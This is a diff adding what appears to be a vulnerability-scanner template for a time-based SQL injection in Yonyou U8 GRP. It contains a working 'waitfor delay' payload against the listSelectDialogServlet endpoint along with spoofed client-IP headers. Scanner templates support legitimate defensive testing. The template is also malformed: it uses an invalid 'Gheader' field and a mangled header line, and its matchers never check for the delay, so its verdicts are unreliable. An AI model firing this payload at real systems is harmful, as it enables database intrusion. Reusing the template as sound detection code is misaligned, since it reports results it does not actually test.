@@ -1,0 +1,35 @@
+id: yonyou-u8-oa-sqli
+
+info:
+  name: Yonyou U8 - SQL Injection
+  author: ritikchaddha
+  severity: critical
+  description: Yonyou U8 GRP slcdtn存在sql延迟注入，GRP的第三个漏洞
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-89
+  tags: yonyou,oa,sqli
+  metadata:
+    max-request: 1
+
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor delay '0:0:2'"
+    Gheader:
+      - X-Remote-IP:127.0.0.1 & X-Originating:127.0.0.1 & X-Forwarded-For:127.0.0.1 & "X-Remote-Addr:127.0.0.1
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[]'
+
+      - type: status
+        status:
+          - 200
+
